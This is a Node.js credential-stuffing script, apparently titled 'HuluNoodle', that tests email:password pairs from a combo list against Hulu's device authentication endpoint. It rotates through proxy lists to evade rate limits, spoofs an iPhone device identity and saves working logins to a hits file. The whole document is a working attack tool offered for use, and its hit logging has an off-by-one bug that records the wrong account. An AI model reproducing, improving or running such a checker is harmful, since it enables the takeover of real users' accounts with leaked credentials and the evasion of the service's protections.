//Requirements Importer
const Request = require("request")
const Chalk = require("chalk")
const Fs = require("fs")

//Variables
const HTTP_Proxies = Fs.readFileSync("./proxies.txt", "utf8").split("\n")
const Accounts = Fs.readFileSync("./combo.txt", "utf8").split("\n")

var Checker_Data = {}
Checker_Data.hits = 0
Checker_Data.invalids = 0
Checker_Data.rpm = 0 //RPM stands for Request Per Minute 
Checker_Data.ltc = Accounts.length //LTC stands for Left To Check
Checker_Data.requests = 0
Checker_Data.hi = 0 //Both Hits & Invalids in one value for finish checking.
Checker_Data.whitelisted_accounts = [] //To avoid duplicate

//Functions
function Add_Hits(account){
    var Hits = Fs.readFileSync("./hits.txt", "utf8")

    if(Hits.length == 0){
        Fs.writeFileSync("./hits.txt", account, "utf8")
    }else{
        Fs.writeFileSync("./hits.txt", `${Hits}\n${account}`, "utf8")
    }
}

function Initiate_A_Checker(start_in_proxy_index){
    var Self_Account_Index = 0

    Main()
    async function Main(){
        if(Checker_Data.hi > Accounts.length){
            Checker_Data.hi = 9999999999999999999
            return
        }

        if(start_in_proxy_index > HTTP_Proxies.length){
            start_in_proxy_index = 0
            Main()
            return
        }

        if(Accounts[Self_Account_Index] == undefined){
            Self_Account_Index += 1
            Main()
            return
        }

        Request.post("https://auth.hulu.com/v1/device/password/authenticate", {
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
            },
            proxy: `http://${HTTP_Proxies[start_in_proxy_index]}`,
            body: `affiliate_name=apple&friendly_name=Andy%27s+Iphone&password=${Accounts[Self_Account_Index].split(":")[1]}&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=${Accounts[Self_Account_Index].split(":")[0]}`
        }, function(err, res, body){
            Checker_Data.requests += 1

            if(err){
                start_in_proxy_index += 1
                Main()
                return
            }

            body = JSON.stringify(body)

            if(Checker_Data.whitelisted_accounts.indexOf(Accounts[Self_Account_Index]) != -1){
                Self_Account_Index += 1
                Main()
                return
            }

            if(res.body == ""){
                start_in_proxy_index += 1
                Main()
                return
            }

            Checker_Data.hi += 1
            Checker_Data.ltc -= 1
            if(body.indexOf("blocked") != -1){
                Checker_Data.whitelisted_accounts.push(Accounts[Self_Account_Index])
                Checker_Data.hits += 1
                Self_Account_Index += 1
                Add_Hits(Accounts[Self_Account_Index])
                Main()
                return
            }
            
            if(body.indexOf("invalid") != -1){
                Checker_Data.invalids += 1
                Self_Account_Index += 1
                Main()
                return
            }

            if(res.statusCode == 200){
                Checker_Data.whitelisted_accounts.push(Accounts[Self_Account_Index])
                Checker_Data.hits += 1
                Self_Account_Index += 1
                Add_Hits(Accounts[Self_Account_Index])
                Main()
                return
            }
        })
    }
}

//Main
setInterval(function(){
    console.clear()
    console.log(Chalk.yellowBright(`=============================================================================================
    ██   ██ ██    ██ ██      ██    ██ ███    ██  ██████   ██████  ██████  ██      ███████ 
    ██   ██ ██    ██ ██      ██    ██ ████   ██ ██    ██ ██    ██ ██   ██ ██      ██      
    ███████ ██    ██ ██      ██    ██ ██ ██  ██ ██    ██ ██    ██ ██   ██ ██      █████   
    ██   ██ ██    ██ ██      ██    ██ ██  ██ ██ ██    ██ ██    ██ ██   ██ ██      ██      
    ██   ██  ██████  ███████  ██████  ██   ████  ██████   ██████  ██████  ███████ ███████  
=============================================================================================`))

    console.log(Chalk.greenBright(`Hits: ${Checker_Data.hits}`))
    console.log(Chalk.redBright(`Invalids: ${Checker_Data.invalids}`))
    console.log(Chalk.magentaBright(`LTC: ${Checker_Data.ltc}`))
    console.log(Chalk.blueBright(`RPM: ${Checker_Data.rpm}`))

    if(Checker_Data.hi == 9999999999999999999){
        console.log(Chalk.green("Done checking."))
        process.exit()
    }
}, 1000)

setInterval(function(){
    Checker_Data.rpm = Checker_Data.requests
    Checker_Data.requests = 0
}, 60000)

for( i = 0; i <= HTTP_Proxies.length; i++ ){
    Initiate_A_Checker(i)
}

process.on("uncaughtException", function(){
    return
})
